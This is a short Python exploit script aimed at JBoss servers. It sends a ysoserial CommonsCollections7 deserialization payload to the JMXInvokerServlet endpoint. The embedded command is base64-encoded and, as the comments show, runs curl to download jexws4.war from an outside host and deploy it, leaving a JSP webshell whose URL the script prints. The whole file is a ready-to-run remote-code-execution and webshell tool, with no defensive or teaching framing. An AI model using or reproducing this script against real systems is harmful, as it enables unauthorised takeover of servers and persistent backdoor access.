import requests
import os
import argparse

payload_file = "./payload.out"
gadget_tool = "./undeserialization.jar"
ysoserial = "./ysoserial.jar"


def generateGadget(cmd):
    # for general, we use ysoserial
    # however, undeserialzation.jar still working
    os.system(f"java -jar {ysoserial} CommonsCollections7 '{cmd}' > {payload_file}")
    file = open(payload_file, "rb")
    payload = file.read()
    file.close()
    return payload


def exploit(url):

    # jboss 5 can not deploy via http so we will download they and deploy them :v
    # if want it deploy as default, take it to JBOSS_HOME/server/default/deploy
    #
    # curl http://www.joaomatosf.com/rnp/jexws4.war --output jexws4.war
    # && ./bin/twiddle.sh -s 127.0.0.1 invoke jboss.system:service=MainDeployer deploy jexws4.war
    #
    # base64 good for run command line in this situation
    # http://www.jackson-t.ca/runtime-exec-payloads.html

    payload = generateGadget(cmd="bash -c {echo,Y3VybCBodHRwOi8vd3d3LmpvYW9tYXRvc2YuY29tL3JucC9qZXh3czQud2FyIC0tb3V0cHV"
                                 "0IGpleHdzNC53YXIgJiYgLi9iaW4vdHdpZGRsZS5zaCAtcyAxMjcuMC4wLjEgaW52b2tlIGpib3NzLnN5c3Rl"
                                 "bTpzZXJ2aWNlPU1haW5EZXBsb3llciBkZXBsb3kgamV4d3M0Lndhcg==}|{base64,-d}|{bash,-i}")
    response = requests.post(url=url + "/invoker/JMXInvokerServlet", data=payload)
    print(response.status_code)
    print("Webshell are: ", url + "/jexws4/jexws.jsp")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Upload web shell")
    parser.add_argument("--url")

    args = parser.parse_args()

    exploit(url=args.url)
